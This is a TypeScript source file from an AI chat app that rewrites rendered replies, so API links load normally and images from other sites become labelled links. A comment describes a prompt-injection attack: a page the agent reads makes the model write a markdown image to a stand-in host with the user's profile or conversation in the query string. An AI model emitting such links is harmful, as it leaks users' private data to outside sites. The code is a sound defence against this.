/**
 * Links the client-side router must not try to own.
 *
 * An agent that saves a file hands back `/api/chats/…/attachments/…`, and a
 * model asked to "link it so the user can open it" writes a plain markdown
 * link rather than an image. `marked` renders that as an anchor, and
 * SvelteKit's global click handler then tries to route it: there is no client
 * route under `/api`, so it synthesises a 404, hands it to `handleError` —
 * which files a client error — and only then falls through to a real browser
 * navigation. The file opens perfectly; the only casualty is an Observatory
 * full of `Error: Not found: /api/…` for something nobody ever saw fail.
 *
 * `data-sveltekit-reload` is how you say "this one is the browser's". Applied
 * per anchor rather than to the whole rendered block, because an ordinary
 * in-app link in a reply should still navigate without a page load.
 */
const API_ANCHOR = /<a\b([^>]*\shref="\/api\/[^"]*"[^>]*)>/gi;

export function releaseApiLinks(html: string): string {
	return html.replace(API_ANCHOR, (whole, attrs: string) =>
		attrs.includes('data-sveltekit-reload') ? whole : `<a${attrs} data-sveltekit-reload>`
	);
}

/** One tag, with `>` allowed inside a quoted attribute value. */
const tag = (name: string) => new RegExp(`<${name}\\b((?:[^>"]|"[^"]*")*)>`, 'gi');
const IMG = tag('img');
const ANCHOR = tag('a');

const attr = (attrs: string, name: string): string | null =>
	new RegExp(`\\s${name}="([^"]*)"`, 'i').exec(attrs)?.[1] ?? null;

/** An image this app serves or one carried in the reply itself. */
export function isLocalImage(src: string): boolean {
	return (/^\/(?!\/)/.test(src) && !src.includes('\\')) || /^data:image\//i.test(src) || /^blob:/i.test(src);
}

/**
 * Stop a reply from fetching anything from another site by being displayed.
 *
 * A markdown image loads the moment it renders, and its address is whatever
 * the model wrote. A page the agent read can tell it to write
 * `![](https://elsewhere.example/?q=…)` with the person's Profile or the
 * conversation in the query string, and the browser delivers it with nobody
 * having clicked anything. So an image from another origin becomes a link
 * that says where it points, and the person decides whether to open it. The
 * page's Content-Security-Policy refuses the same requests; this is what makes
 * the refusal readable instead of a broken image.
 *
 * Links to other sites open in a new tab, so following a source does not
 * replace a conversation that may still be streaming.
 *
 * Runs on DOMPurify's output, like `releaseApiLinks`, so the attributes are
 * already escaped and always double-quoted.
 */
export function tameExternalContent(html: string): string {
	return html
		.replace(IMG, (_whole, attrs: string) => {
			const src = attr(attrs, 'src') ?? '';
			if (isLocalImage(src)) return `<img${attrs.replace(/\ssrcset="[^"]*"/i, '')}>`;
			if (!/^https?:\/\//i.test(src)) return '';
			const alt = attr(attrs, 'alt')?.trim();
			const host = src.replace(/^https?:\/\//i, '').split(/[/?#]/)[0];
			return `<a class="external-image" href="${src}" target="_blank" rel="noopener noreferrer">${alt || 'Image'} (${host})</a>`;
		})
		.replace(ANCHOR, (whole, attrs: string) => {
			const href = attr(attrs, 'href') ?? '';
			if (!/^https?:\/\//i.test(href) || /\starget=/i.test(attrs)) return whole;
			return `<a${attrs.replace(/\srel="[^"]*"/i, '')} target="_blank" rel="noopener noreferrer">`;
		});
}
